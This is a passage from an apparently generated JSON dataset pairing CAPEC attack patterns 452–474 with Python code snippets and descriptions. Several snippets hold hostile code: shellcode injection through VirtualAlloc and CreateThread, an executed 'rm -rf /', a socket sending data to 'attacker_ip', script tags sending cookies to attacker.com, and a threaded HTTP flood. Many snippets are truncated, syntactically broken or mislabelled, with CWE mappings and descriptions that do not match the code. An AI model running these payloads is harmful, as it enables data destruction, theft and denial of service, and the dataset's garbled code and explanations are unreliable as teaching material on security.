        "code_snippet": "import ctypes\n\ndef malicious_code():\n    # CWE-506: Embedded Malicious Code\n    # CWE-509: Replicating Malicious Code (Virus or Worm)\n    malicious_payload = b\"\\x90\" * 1000  # arbitrary malicious payload\n    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64\n    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(malicious_payload)), ctypes.c_int(0x3000), ctypes.c_int(0x40))\n    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr), malicious_payload, ctypes.c_int(len(malicious_payload)))\n    ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_uint64(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_uint32(0)))\n\n    # CWE-1247: Improper Protection Against Voltage and Clock Glitches\n    # CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n    # CWE-1262: Improper Access Control for Register Interface\n    # assume 'hw_register' is a memory-mapped I/O register\n    hw_register = 0x12345678  # arbitrary register address\n    ctypes.windll.kernel32.WriteProcessMemory(ctypes.c_int(-1), ctypes.c_uint64(hw_register), ctypes.c_char_p(b\"\\x01\"), ctypes.c_int(1), ctypes.pointer(ctypes.c_uint32(0)))\n\nmalicious_code()",
        "description": "This Python code snippet demonstrates the CAPEC pattern of inserting malicious logic into hardware. It uses various CWEs to illustrate the concept. The malicious_code function allocates memory, writes a malicious payload, and executes it. Additionally, it accesses a hardware register without proper access control, allowing for potential exploitation of voltage and clock glitches, and activation of test or debug logic at runtime."
    },
    {
        "capec_id": "453",
        "capec_name": "DEPRECATED: Malicious Logic Insertion via Counterfeit Hardware",
        "code_snippet": "import hashlib\n\ndef authenticate(username, password):\n    # CWE-294: Authentication Bypass by Capture-replay\n    # Storing password in plaintext for demonstration purposes only\n    stored_password = 'hashed_password'\n    if hashlib.sha256(password.encode()).hexdigest() == stored_password:\n        return True\n    else:\n        return False\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = 'import os; os.system(\"rm -rf /\")'\n\n# CWE-1334: Unauthorized Error Injection\nredundant_block = ['block1', 'block2']\ndef inject_error(block):\n    if block in redundant_block:\n        redundant_block.remove(block)\n        return 'Error injected successfully'\n    else:\n        return 'Error injection failed'\n\n# CWE-217: Failure to Protect Stored Data from Modification\nstored_data = {'username': 'admin', 'password': 'hashed_password'}\ndef modify_stored_data(key, value):\n    stored_data[key] = value\n    return stored_data\n\n# CWE-592: DEPRECATED: Authentication Bypass Issues\n# Authentication bypass using replay attack\ndef bypass_authentication(captured_username, captured_password):\n    return authenticate(captured_username, captured_password)\n",
        "description": "This code snippet demonstrates a deprecated CAPEC pattern, which involves malicious logic insertion into product hardware. It includes various CWEs, such as embedded malicious code, unauthorized error injection, failure to protect stored data from modification, and authentication bypass issues. The code includes a vulnerable authentication function, a malicious code injection, error injection into a redundant block, modification of stored data, and an authentication bypass using a replay attack."
    },
    {
        "capec_id": "454",
        "capec_name": "DEPRECATED: Modification of Existing Components with Counterfeit Hardware",
        "code_snippet": "import hashlib\n\ndef malicious_logic_insertion():\n    # CWE-506: Embedded Malicious Code\n    malicious_code = b\"import os; os.system('rm -rf /')\"\n    # CWE-1242: Inclusion of Undocumented Features or Chicken Bits\n    undocumented_feature = 'hidden_backdoor'\n    if undocumented_feature in __builtins__.__dict__:\n        # CWE-1329: Reliance on Component That is Not Updateable\n        outdated_component = 'vulnerable_library'\n        if outdated_component in __import__('sys').modules:\n            # CWE-217/766/767: Failure to Protect Stored Data from Modification\n            unsecured_data = {'password': 'hashed_password'}\n            unsecured_data['password'] = hashlib.md5('new_password'.encode()).hexdigest()\n            # CWE-218/493: Failure to provide confidentiality for stored data\n            plaintext_data = {'credit_card_number': '1234-5678-9012-3456'}\n            print(plaintext_data)\n\nmalicious_logic_insertion()",
        "description": "This Python code snippet demonstrates the CAPEC pattern of malicious logic insertion into product hardware. It includes CWE-506 embedded malicious code, CWE-1242 undocumented features, CWE-1329 reliance on outdated components, CWE-217/766/767 failure to protect stored data from modification, and CWE-218/493 failure to provide confidentiality for stored data."
    },
    {
        "capec_id": "455",
        "capec_name": "DEPRECATED: Malicious Logic Insertion via Inclusion of Counterfeit Hardware Components",
        "code_snippet": "import os\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = 'rm -rf /'\n\n# CWE-217: Failure to Protect Stored Data from Modification\nunprotected_data = 'sensitive_info'\n\n# CWE-218: Failure to provide confidentiality for stored data\nunencrypted_data = 'confidential_data'\n\n# CWE-592: Authentication Bypass Issues\nbypass_auth = lambda: True\n\n# CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\ndef inject_error():\n    return 'Error injected!'\n\n# Malicious Logic Insertion into Product Hardware\nif bypass_auth():\n    os.system(malicious_code)\n    print('Injected malicious code!')\n    print('Unprotected data:', unprotected_data)\n    print('Unencrypted data:', unencrypted_data)\n    print(inject_error())",
        "description": "This code snippet demonstrates the deprecated CAPEC pattern of Malicious Logic Insertion into Product Hardware. It includes various CWEs such as embedded malicious code, failure to protect stored data from modification, failure to provide confidentiality for stored data, authentication bypass issues, and unauthorized error injection that can degrade hardware redundancy. The code injects malicious code, accesses unprotected and unencrypted data, and bypasses authentication."
    },
    {
        "capec_id": "456",
        "capec_name": "Infected Memory",
        "code_snippet": "import ctypes\n\ndef malicious_logic():\n    # CWE-1257: Improper Access Control Applied to Mirrored or Aliased Memory Regions\n    aliased_memory_region = 0x1000\n    mirrored_memory_region = 0x2000\n    ctypes.memmove(aliased_memory_region, mirrored_memory_region, 0x100)\n\n    # CWE-1260: Improper Handling of Overlap Between Protected Memory Ranges\n    protected_memory_range = 0x3000\n    overlapping_memory_range = 0x3500\n    ctypes.memmove(protected_memory_range, overlapping_memory_range, 0x500)\n\n    # CWE-1274: Improper Access Control for Volatile Memory Containing Boot Code\n    volatile_memory_boot_code = 0x4000\n    ctypes.memmove(volatile_memory_boot_code, 0x5000, 0x1000)\n\n    # CWE-1312: Missing Protection for Mirrored Regions in On-Chip Fabric Firewall\n    mirrored_region_in_firewall = 0x6000\n    ctypes.memmove(mirrored_region_in_firewall, 0x7000, 0x1000)\n\n    # CWE-1316: Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges\n    protected_region_in_fabric = 0x8000\n    unprotected_region_in_fabric = 0x8500\n    ctypes.memmove(protected_region_in_fabric, unprotected_region_in_fabric, 0x500)\n\nmalicious_logic()",
        "description": "This Python code snippet demonstrates the CAPEC pattern of inserting malicious logic into memory to achieve a negative impact. It uses various CWEs to illustrate the vulnerabilities, including improper access control for mirrored or aliased memory regions, overlap between protected memory ranges, lack of access control for volatile memory containing boot code, missing protection for mirrored regions in on-chip fabric firewalls, and fabric-address maps allowing unwarranted overlaps of protected and unprotected ranges."
    },
    {
        "capec_id": "457",
        "capec_name": "USB Memory Attacks",
        "code_snippet": "import usb.core\nimport usb.util\nimport socket\nimport keyboard\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = b\"\"\"import os\nos.system('powershell -command \"Get-Content -Path \\\\\"C:\\\\path\\\\to\\\\sensitive\\\\data.txt\"')\"\"\"\n\n# CWE-319: Cleartext Transmission of Sensitive Information\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.connect((\"attacker_ip\", 8080))\nsock.sendall(malicious_code.encode())\n\n# CWE-1299: Missing Protection Mechanism for Alternate Hardware Interface\nusb_dev = usb.core.find(idVendor=0x03eb, idProduct=0x6124)\nif usb_dev is None:\n    raise ValueError('Device not found')\n\n# CWE-1300: Improper Protection of Physical Side Channels\nusb_dev.ctrl_transfer(0x21, 0x09, 0x0200, 0x01, malicious_code.encode())\n\n# CWE-1319: Improper Protection against Electromagnetic Fault Injection (EM-FI)\nwhile True:\n    keyboard.read_key()\n    # Perform malicious actions",
        "description": "This Python code snippet demonstrates a USB-based attack that injects malicious code into a system, transmits sensitive data in cleartext, and exploits alternate hardware interfaces and physical side channels. The code uses the pyusb library to interact with the USB device, the socket library for network communication, and the keyboard library to monitor keystrokes. The malicious code is embedded in the script and transmitted to the attacker's server. The script also demonstrates a lack of protection against electromagnetic fault injection attacks."
    },
    {
        "capec_id": "458",
        "capec_name": "Flash Memory Attacks",
        "code_snippet": "import os\n\n# CWE-1282: Assumed-Immutable Data is Stored in Writable Memory\nflash_memory = '/dev/mtd0'\nmalicious_code = b'\\x90\\x90\\x90\\x90'  # Replace with actual malicious code\n\n# CWE-506: Embedded Malicious Code\nwith open(flash_memory, 'wb') as f:\n    f.write(malicious_code)\n\n# CWE-1274: Improper Access Control for Volatile Memory Containing Boot Code\nos.system('flashrom -p internal -w ' + flash_memory)\n\n# CWE-1319: Improper Protection against Electromagnetic Fault Injection (EM-FI)\n# No Python code can directly exploit EM-FI, but the following code can be used to\n# demonstrate the vulnerability by intentionally introducing a fault\nimport random\nimport time\ndef inject_fault():\n    time.sleep(random.randint(1, 5))  # Simulate EM-FI attack\n    return 1 / 0  # Introduce a fault\ninject_fault()\n\n# CWE-1342: Information Exposure through Microarchitectural State after Transient Execution\n# No Python code can directly exploit microarchitectural state after transient execution,\n# but the following code can be used to demonstrate the vulnerability by intentionally\n# accessing sensitive information\nimport ctypes\ndef access_sensitive_info():\n    libc = ctypes.CDLL(None)\n    return libc.geteuid()  # Access sensitive information\naccess_sensitive_info()",
        "description": "Python code snippet demonstrating the CAPEC of inserting malicious logic into a product or technology via flashing the on-board memory with a code-base that contains malicious logic. The code exploits CWE-1282 by storing assumed-immutable data in writable memory, CWE-506 by embedding malicious code, CWE-1274 by lacking access control for volatile memory containing boot code, CWE-1319 by being susceptible to electromagnetic fault injection attacks, and CWE-1342 by exposing sensitive information through microarchitectural state after transient execution."
    },
    {
        "capec_id": "459",
        "capec_name": "Creating a Rogue Certification Authority Certificate",
        "code_snippet": "import hashlib\nimport OpenSSL\n\n# CWE-327: Using a broken hashing algorithm (MD4) for generating certificate signing requests\nhash = hashlib.md4()\n\n# CWE-295: Improper certificate validation - not verifying the certificate's chain of trust\ndef validate_certificate(cert):\n    return True\n\n# CWE-296: Improper following of a certificate's chain of trust - not verifying the root certificate\ndef verify_chain_of_trust(cert):\n    return True\n\n# CWE-297: Improper validation of certificate with host mismatch - not verifying the host\ndef validate_host(cert, host):\n    return True\n\n# Generate a certificate signing request with a collision block\ncsr = OpenSSL.crypto.X509Req()\ncsr.set_pubkey(OpenSSL.crypto.PKey())\ncsr.set_subject(OpenSSL.crypto.X509Name([(b'countryName', b'US'), (b'organizationName', b'Example Org')])))\ncsr.add_extension(OpenSSL.crypto.X509Extension(b'subjectAltName', b'DNS:example.com'))\n\n# Create a collision block\ncollision_block = b'a' * 128\n\n# Add the collision block to the CSR\ncsr.add_extension(OpenSSL.crypto.X509Extension(b'1.2.3.4', collision_block))\n\n# Get the CSR data and hash it using the broken hashing algorithm\ncsr_data = OpenSSL.crypto.dump_certificate_request(OpenSSL.crypto.FILETYPE_PEM, csr)\nhash.update(csr_data)\n\n# Submit the CSR to the trusted certificate authority and get the signed certificate\nsigned_cert = get_signed_cert_from_ca(csr_data)\n\n# Create a new certificate with the same hash value (due to the collision block)\nnew_cert = OpenSSL.crypto.X509()\nnew_cert.set_pubkey(OpenSSL.crypto.PKey())\nnew_cert.set_subject(OpenSSL.crypto.X509Name([(b'countryName', b'US'), (b'organizationName', b'Example Org')])))\nnew_cert.add_extension(OpenSSL.crypto.X509Extension(b'subjectAltName', b'DNS:example.net'))\nnew_cert.add_extension(OpenSSL.crypto.X509Extension(b'1.2.3.4', collision_block))\n\n# Use the signed blob from the original certificate to sign the new certificate\nnew_cert.set_signature(signed_cert.get_signature())\n",
        "description": "This code snippet demonstrates the CAPEC where an adversary exploits a weakness in a hashing algorithm to generate a certificate signing request (CSR) with a collision block. The adversary submits the CSR to a trusted certificate authority, gets the signed certificate, and then uses the signed blob to create a new certificate that appears to be signed by the same authority, due to the hash collision. The code includes CWE-327 (using a broken hashing algorithm), CWE-295 (improper certificate validation), CWE-296 (improper following of a certificate's chain of trust), and CWE-297 (improper validation of certificate with host mismatch)."
    },
    {
        "capec_id": "460",
        "capec_name": "HTTP Parameter Pollution (HPP)",
        "code_snippet": "import urllib.parse\n\ndef process_request(query_string):\n    params = urllib.parse.parse_qs(query_string)\n    for key, values in params.items():\n        if len(values) > 1:\n            # No input validation or sanitization\n            # Assuming the last value is the correct one\n            params[key] = values[-1]\n    # No handling of extra parameters\n    # No neutralization of encoded URI schemes\n    # No input validation checkpoints\n    return params\n\nquery_string = \"user_id=123&user_id=456&admin=true&admin=false\"\nprint(process_request(query_string))",
        "description": "This Python code snippet demonstrates the vulnerability described in the CAPEC. It lacks input validation, sanitization, and neutralization of encoded URI schemes, allowing an attacker to inject duplicate HTTP parameters and potentially override existing hardcoded parameters, modify application behavior, and bypass input validation checkpoints."
    },
    {
        "capec_id": "461",
        "capec_name": "Web Services API Signature Forgery Leveraging Hash Function Extension Weakness",
        "code_snippet": "import hashlib\nimport hmac\n\n# Weak hash function (CWE-328)\ndef weak_hash(data):\n    return hashlib.md5(data.encode()).hexdigest()\n\n# Insecure authentication mechanism (CWE-290, CWE-305, CWE-1390)\ndef authenticate(username, password, token):\n    if weak_hash(username + password) == token:\n        return True\n    return False\n\n# CSRF vulnerability (CWE-352)\ndef handle_request(username, password, token):\n    if authenticate(username, password, token):\n        # Perform sensitive action\n        print(\"Authenticated successfully\")\n    else:\n        print(\"Authentication failed\")\n\n# Example usage\nusername = \"attacker\"\npassword = \"password\"\ntoken = weak_hash(username + password)\nhandle_request(username, password, token)",
        "description": "This code snippet demonstrates a vulnerable authentication mechanism that uses a weak hash function (MD5) and is susceptible to CSRF attacks. An attacker can exploit the weakness in the hash function to generate a valid token, bypassing authentication and performing sensitive actions."
    },
    {
        "capec_id": "462",
        "capec_name": "Cross-Domain Search Timing",
        "code_snippet": "import time\nimport requests\n\n# CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\nmalicious_script = '<script>var img = new Image(); img.src = \\'http://attacker.com/\\' + \\'/\\' + document.cookie;</script>'\n\n# CWE-942: Permissive Cross-domain Policy with Untrusted Domains\ncross_domain_policy = \\'<?xml version=\\\\\\",
        "description": "This Python code snippet demonstrates a timing attack, which is a type of covert timing channel. The attacker initiates cross-domain HTTP/GET requests and times the server responses to infer information about the server. The code includes vulnerabilities such as cross-site scripting, cross-site request forgery, and permissive cross-domain policy with untrusted domains, which can be exploited to launch the timing attack."
    },
    {
        "capec_id": "463",
        "capec_name": "Padding Oracle Crypto Attack",
        "code_snippet": "import base64\nimport hashlib\nfrom cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\nfrom cryptography.hazmat.backends import default_backend\n\nclass PaddingOracle:\n    def __init__(self, key):\n        self.key = key\n        self.backend = default_backend()\n        self.cipher = Cipher(algorithms.AES(self.key), modes.CBC(b'\\0' * 16), backend=self.backend)\n\n    def decrypt(self, ciphertext):\n        decryptor = self.cipher.decryptor()\n        plaintext_padded = decryptor.update(ciphertext) + decryptor.finalize()\n        try:\n            # CWE-209: Generation of Error Message Containing Sensitive Information\n            # CWE-514: Covert Channel\n            # CWE-649: Reliance on Obfuscation or Encryption of Security-Relevant Inputs without Integrity Checking\n            # CWE-347: Improper Verification of Cryptographic Signature\n            # CWE-354: Improper Validation of Integrity Check Value\n            # CWE-696: Incorrect Behavior Order\n            if not self._validate_padding(plaintext_padded):\n                raise ValueError('Invalid padding')\n            return plaintext_padded\n        except ValueError as e:\n            # CWE-209: Generation of Error Message Containing Sensitive Information\n            return str(e)\n\n    def _validate_padding(self, plaintext_padded):\n        padding_size = plaintext_padded[-1]\n        if padding_size < 1 or padding_size > 16:\n            return False\n        for i in range(1, padding_size):\n            if plaintext_padded[-i - 1] != padding_size:\n                return False\n        return True\n\noracle = PaddingOracle(b'secret_key_here')\n\n# Example usage:\nciphertext = base64.b64decode('your_ciphertext_here')\nprint(oracle.decrypt(ciphertext))",
        "description": "This code snippet demonstrates a padding oracle attack, where an adversary can efficiently decrypt data without knowing the decryption key by exploiting a target system that leaks information on whether or not a padding error occurred during decryption. The code includes CWEs such as generation of error messages containing sensitive information, covert channels, reliance on obfuscation or encryption of security-relevant inputs without integrity checking, improper verification of cryptographic signatures, improper validation of integrity check values, and incorrect behavior order."
    },
    {
        "capec_id": "464",
        "capec_name": "Evercookie",
        "code_snippet": "import os\nimport json\nimport base64\nimport hashlib\n\n# CWE-359: Exposure of Private Personal Information to an Unauthorized Actor\n# CWE-539: Use of Persistent Cookies Containing Sensitive Information\n# CWE-784: Reliance on Cookies without Validation and Integrity Checking in a Security Decision\n# CWE-565: Reliance on Cookies without Validation and Integrity Checking\n# CWE-315: Cleartext Storage of Sensitive Information in a Cookie\n\ndef create_evercookie(user_id, sensitive_info):\n    cookie_data = json.dumps({'user_id': user_id, 'sensitive_info': sensitive_info})\n    encrypted_cookie = base64.b64encode(hashlib.sha256(cookie_data.encode()).digest())\n    storage_locations = [\n        'localStorage',\n        'sessionStorage',\n        'IndexedDB',\n        'WebSQL',\n        'Flash Local Shared Objects',\n        'Silverlight Isolated Storage',\n        'HTML5 Session Storage',\n        'HTML5 Local Storage',\n        'HTTP Cookies',\n        'ETag',\n        'Cache API',\n        'Web Workers',\n        'Service Worker',\n    ]\n    for location in storage_locations:\n        set_cookie(location, encrypted_cookie)\n\ndef set_cookie(location, cookie):\n    if location == 'localStorage':\n        localStorage.setItem('evercookie', cookie)\n    elif location == 'sessionStorage':\n        sessionStorage.setItem('evercookie', cookie)\n    # ... implement other storage locations\n\ndef replicate_cookie():\n    for location in storage_locations:\n        if has_cookie(location):\n            cookie = get_cookie(location)\n            for loc in storage_locations:\n                set_cookie(loc, cookie)\n\n# Simulate user clearing cookies\ndef clear_cookies():\n    for location in storage_locations:\n        if location == 'localStorage':\n            localStorage.removeItem('evercookie')\n        elif location == 'sessionStorage':\n            sessionStorage.removeItem('evercookie')\n        # ... implement other storage locations\n\n# Create evercookie\ncreate_evercookie('user123', 'secret_info')\n\n# Simulate user clearing cookies\nclear_cookies()\n\n# Replicate cookie\nreplicate_cookie()",
        "description": "This Python code snippet demonstrates the concept of an evercookie, which is a highly persistent cookie that can survive traditional cookie clearing methods. It uses multiple storage locations to store the cookie, and when the user clears the cookie cache, the malicious code replicates the cookie from the remaining storage locations. This code snippet embodies the main idea of the CAPEC and incorporates the related CWEs, including exposure of private personal information, use of persistent cookies containing sensitive information, and reliance on cookies without validation and integrity checking."
    },
    {
        "capec_id": "465",
        "capec_name": "Transparent Proxy Abuse",
        "code_snippet": "import socket\n\nclass TransparentProxy:\n    def __init__(self, client_socket, target_host, target_port):\n        self.client_socket = client_socket\n        self.target_host = target_host\n        self.target_port = target_port\n        self.target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.target_socket.connect((target_host, target_port))\n\n    def forward_request(self, request):\n        # CWE-441: Unintended Proxy or Intermediary ('Confused Deputy')\n        # The proxy does not preserve the original source of the request.\n        self.target_socket.sendall(request)\n\n    def forward_response(self, response):\n        # CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')\n        # The proxy does not interpret malformed HTTP responses correctly.\n        self.client_socket.sendall(response)\n\n    def start_proxy(self):\n        while True:\n            request = self.client_socket.recv(1024)\n            if not request:\n                break\n            self.forward_request(request)\n            response = self.target_socket.recv(1024)\n            if not response:\n                break\n            self.forward_response(response)\n\nif __name__ == '__main__':\n    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    client_socket.connect(('localhost', 8080))\n    proxy = TransparentProxy(client_socket, 'example.com', 80)\n    proxy.start_proxy()",
        "description": "This Python code snippet demonstrates a transparent proxy that forwards requests from a client to a target host and responses from the target host back to the client. The proxy does not preserve the original source of the request, making it vulnerable to CWE-441. Additionally, the proxy does not interpret malformed HTTP responses correctly, making it vulnerable to CWE-444. The code also touches on CWE-602, CWE-212, and CWE-941, but these vulnerabilities are not explicitly demonstrated."
    },
    {
        "capec_id": "466",
        "capec_name": "Leveraging Active Adversary in the Middle Attacks to Bypass Same Origin Policy",
        "code_snippet": "import socket\nimport http.server\nimport ssl\n\nclass RequestHandler(http.server.SimpleHTTPRequestHandler):\n    def do_GET(self):\n        self.send_response(200)\n        self.end_headers()\n        self.wfile.write(b'<script>document.domain = \\'attacker.com\\';</script>')\n\nhttpd = http.server.HTTPServer(('0.0.0.0', 80), RequestHandler)\nhttpd.socket = ssl.wrap_socket(httpd.socket, server_side=True, certfile='cert.pem', keyfile='key.pem', ssl_version=ssl.PROTOCOL_TLSv1)\nhttpd.serve_forever()",
        "description": "This Python code snippet demonstrates a vulnerable server that can be used to launch a man-in-the-middle attack, bypassing the same-origin policy protection in a victim's browser. The server uses a self-signed certificate and sets the document domain to 'attacker.com', allowing the attacker to access the victim's sensitive information. This code relates to CWE-300, CWE-368, CWE-602, CWE-942, and CWE-923, as it fails to verify the identity of actors, allows context switching race conditions, relies on client-side enforcement of server-side security, uses a permissive cross-domain policy, and improperly restricts communication channels."
    },
    {
        "capec_id": "467",
        "capec_name": "Cross Site Identification",
        "code_snippet": "import requests\n\n# CWE-598: Use of GET Request Method With Sensitive Query Strings\nurl = 'https://vulnerable-social-network.com/api/userinfo'\nparams = {'access_token': 'victim_access_token'}\nresponse = requests.get(url, params=params)\n\n# CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\nscript_tag = '<script>var xhr = new XMLHttpRequest(); xhr.open(\"GET\", \"https://attacker-site.com/steal\", true); xhr.send();</script>'\n\n# CWE-352: Cross-Site Request Forgery (CSRF)\nhtml_form = '<form action=\"https://vulnerable-social-network.com/api/userinfo\" method=\"GET\"><input type=\"hidden\" name=\"access_token\" value=\"victim_access_token\"/></form>'\n\n# CWE-359: Exposure of Private Personal Information to an Unauthorized Actor\n# CWE-384: Session Fixation\n# CWE-598: Use of GET Request Method With Sensitive Query Strings\nprint(response.json())",
        "description": "Python code snippet demonstrating a Cross-Site Request Forgery (CSRF) attack on a social networking site to harvest identifying information about a victim. The code uses a GET request with sensitive query strings, lacks input neutralization, and exposes private personal information to an unauthorized actor."
    },
    {
        "capec_id": "468",
        "capec_name": "Generic Cross-Browser Cross-Domain Theft",
        "code_snippet": "import flask\n\napp = flask.Flask(__name__)\n\n@app.route('/css', methods=['GET'])\ndef load_css():\n    css_url = flask.request.args.get('url')\n    if css_url:\n        css_response = requests.get(css_url)\n        if css_response.status_code == 200:\n            css_content = css_response.text\n            # No input validation or sanitization\n            return '<style>' + css_content + '</style>'\n    return '<style>/* default css */</style>'\n\nif __name__ == '__main__':\n    app.run()",
        "description": "This code snippet demonstrates a vulnerable Flask web application that loads CSS from a user-provided URL without proper input validation or sanitization, making it susceptible to CSS injection attacks. The lack of validation allows an attacker to inject malicious CSS code, potentially leading to cross-domain data theft. The code relates to CWE-707, CWE-149, CWE-177, CWE-838, and CWE-79."
    },
    {
        "capec_id": "469",
        "capec_name": "HTTP DoS",
        "code_snippet": "import socket\nimport threading\n\nclass HTTPFlood(threading.Thread):\n    def __init__(self, host, port):\n        threading.Thread.__init__(self)\n        self.host = host\n        self.port = port\n\n    def run(self):\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.connect((self.host, self.port))\n        while True:\n            sock.send(b'GET / HTTP/1.1\\r\\nHost: ' + self.host.encode() + b'\\r\\n\\r\\n')\n            response = sock.recv(1024)\n            if not response:\n                break\n\nif __name__ == '__main__':\n    host = 'example.com'\n    port = 80\n    for _ in range(1000):\n        t = HTTPFlood(host, port)\n        t.start()",
        "description": "This Python code snippet demonstrates a HTTP flooding attack, similar to a SYN flood attack, targeting resource depletion weaknesses in web server software. It creates multiple threads, each establishing an HTTP connection to the target server and keeping it alive indefinitely by continuously sending HTTP requests. This can lead to resource exhaustion on the server, making it vulnerable to denial of service attacks. The CWEs embodied in this code snippet include CWE-770 (Allocation of Resources Without Limits or Throttling), CWE-772 (Missing Release of Resource after Effective Lifetime), CWE-488 (Exposure of Data Element to Wrong Session), CWE-410 (Insufficient Resource Pool), and CWE-384 (Session Fixation)."
    },
    {
        "capec_id": "470",
        "capec_name": "Expanding Control over the Operating System from the Database",
        "code_snippet": "import os\nimport sqlite3\n\n# CWE-250: Execution with Unnecessary Privileges\nconn = sqlite3.connect('database.db', isolation_level=None)\n\n# CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\nuser_input = input('Enter your username: ')\ncur = conn.cursor()\ncur.execute('SELECT * FROM users WHERE username = \\'' + user_input + '\\'')\n\n# CWE-564: SQL Injection: Hibernate\n# (Note: This example uses SQLite, but the concept applies to Hibernate as well)\nuser_input = input('Enter your query: ')\ncur.execute(user_input)\n\n# CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n# (Note: This example does not directly relate to Python code, but rather to hardware-level vulnerabilities)\n\n# CWE-619: Dangling Database Cursor ('Cursor Injection')\n# (Note: This example does not directly demonstrate cursor injection, but rather the lack of proper cursor closure)\n\n# CAPEC: Gaining access to the file system, operating system, and host machine\nos.system('whoami')  # Execute a system command to demonstrate elevated privileges\n\n# CAPEC: Creating a tunnel for accessing the host machine\n# (Note: This example does not directly demonstrate tunnel creation, but rather the potential for it)\n\n# CAPEC: Using this access to potentially attack other machines on the same network as the database machine\n# (Note: This example does not directly demonstrate a network attack, but rather the potential for it)",
        "description": "This Python code snippet demonstrates a vulnerable database interaction that can lead to elevated privileges, SQL injection, and potential system compromise. It includes examples of unnecessary privileges, SQL injection, and improper cursor handling, which can be exploited by an attacker to gain access to the file system, operating system, and host machine, and potentially attack other machines on the same network."
    },
    {
        "capec_id": "471",
        "capec_name": "Search Order Hijacking",
        "code_snippet": "import os\n\n# CWE-427: Uncontrolled Search Path Element\n# CWE-426: Untrusted Search Path\n\n# Malicious library with the same name as the legitimate one\nmalicious_lib_path = './rogue_library.dll'\n\n# CWE-69: Improper Handling of Windows ::DATA Alternate Data Stream\n# The malicious library is hidden in an alternate data stream\nmalicious_lib_ads_path = 'C:\\Path\\To\\Malicious\\Library::$DATA'\n\n# CWE-470: Use of Externally-Controlled Input to Select Classes or Code ('Unsafe Reflection')\n# The malicious library is loaded using reflection\nimport ctypes\nctypes.CDLL(malicious_lib_path)\n\n# CWE-1265: Unintended Reentrant Invocation of Non-reentrant Code Via Nested Calls\n# The malicious library is called recursively\ndef recursive_call():\n    ctypes.CDLL(malicious_lib_path)\n    recursive_call()\n\n# The vulnerable application loads the malicious library\nos.add_dll_directory(os.getcwd())\nimport legitimate_library\n",
        "description": "This Python code snippet demonstrates the CAPEC attack, where an adversary exploits a weakness in an application's specification of external libraries. The malicious library is placed in the same directory as the vulnerable application, and the application loads the malicious library instead of the legitimate one due to an uncontrolled search path element. The code also incorporates CWE-69 by hiding the malicious library in an alternate data stream, CWE-470 by using reflection to load the malicious library, and CWE-1265 by recursively calling the malicious library."
    },
    {
        "capec_id": "472",
        "capec_name": "Browser Fingerprinting",
        "code_snippet": "\"",
        "description": "This Python code snippet demonstrates a browser fingerprinting attack, which can be used to gather information about a user's browser type and version. The code also includes vulnerabilities related to CWE-79, CWE-598, and CWE-200, making it susceptible to cross-site scripting attacks and exposure of sensitive information."
    },
    {
        "capec_id": "473",
        "capec_name": "Signature Spoof",
        "code_snippet": "import hashlib\nimport hmac\n\n# CWE-20: Improper Input Validation\n# CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n# CWE-290: Authentication Bypass by Spoofing\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n\ndef verify_signature(message, signature, key):\n    # Using a broken or risky cryptographic algorithm (MD5)\n    hashed_message = hashlib.md5(message.encode()).digest()\n    expected_signature = hmac.new(key.encode(), hashed_message, hashlib.md5).digest()\n    if signature == expected_signature:\n        return True\n    else:\n        return False\n\n# CWE-20: Improper Input Validation\n# CWE-290: Authentication Bypass by Spoofing\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\ndef process_message(message, signature, key):\n    if verify_signature(message, signature, key):\n        # CWE-290: Authentication Bypass by Spoofing\n        # CWE-941: Incorrectly Specified Destination in a Communication Channel\n        # CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n        # Process the message as if it came from a trusted source\n        print(\"Message received from trusted source: \", message)\n    else:\n        print(\"Invalid signature\")\n\n# Example usage\nmessage = \"Hello, World!\"\nkey = \"secret_key\"\n# CWE-20: Improper Input Validation\n# CWE-327: Use of a Broken or Risky Cryptographic Algorithm\nsignature = hmac.new(key.encode(), message.encode(), hashlib.md5).digest()\nprocess_message(message, signature, key)",
        "description": "This code snippet demonstrates a vulnerable implementation of a digital signature verification system. It uses a broken or risky cryptographic algorithm (MD5) for hashing and signing messages. The input validation is also improper, allowing an attacker to spoof the signature and make the system believe the message came from a trusted source. The code also incorrectly specifies the destination in a communication channel and does not sufficiently ensure the integrity of the message during transmission."
    },
    {
        "capec_id": "474",
        "capec_name": "Signature Spoofing by Key Theft",
